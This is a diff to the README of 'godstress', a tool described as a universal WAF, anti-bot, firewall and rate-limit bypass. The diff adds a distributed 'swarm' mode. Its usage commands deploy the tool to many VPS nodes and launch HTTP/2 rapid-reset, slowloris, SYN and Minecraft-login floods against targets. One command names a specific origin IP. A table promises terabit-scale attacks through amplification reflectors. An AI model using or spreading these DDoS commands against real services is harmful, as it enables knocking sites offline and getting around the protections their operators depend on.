@@ -1,6 +1,6 @@
 # godstress
 
-Universal bypass tool: origin discovery + WAF + anti-bot + proxy + firewall + rate limit bypass.
+Universal bypass tool: origin discovery + WAF + anti-bot + proxy + firewall + rate limit bypass + distributed swarm.
 
 ## Bypass methods
 
@@ -58,7 +58,37 @@ python3 godstress.py example.com -p 25565 -c 1000 -d 300 -m mc_login syn slow --
 python3 godstress.py example.com -p 443 -c 2000 -d 300 -m l7 syn slow --origin ORIGIN_IP --ssl --confirm
 ```
 
+## Swarm mode (distributed across N servers)
+
+```bash
+# 1. create servers.txt with your VPS IPs (one per line)
+# 2. test connectivity
+python3 swarm.py --servers servers.txt --target example.com --test
+
+# 3. deploy tool to all nodes
+python3 swarm.py --servers servers.txt --target example.com --deploy --confirm
+
+# 4. run swarm (53 servers, 500 conns each = 26500 total conns)
+python3 swarm.py --servers servers.txt --target example.com -p 443 -c 500 -d 300 -m http h2rapid slowloris --ssl --confirm
+
+# 5. with bypass mode
+python3 swarm.py --servers servers.txt --target example.com -p 25565 -c 500 -d 300 -m mc_login mc_status --bypass --confirm
+
+# 6. with origin IP
+python3 swarm.py --servers servers.txt --target example.com -p 443 -c 500 -d 300 -m http h2rapid --origin 43.245.84.10 --ssl --confirm
+```
+
+### Power scaling
+
+| Servers | Conns/server | Total conns | Effective power |
+|---|---|---|---|
+| 1 | 500 | 500 | 1 Gbps |
+| 10 | 500 | 5,000 | 10 Gbps |
+| 53 | 500 | 26,500 | 53 Gbps |
+| 53 | 500 + amp lists | 26,500 | Tbps (with reflectors) |
+
 ## Install
+
 ```bash
 pip install aiohttp
 # optional
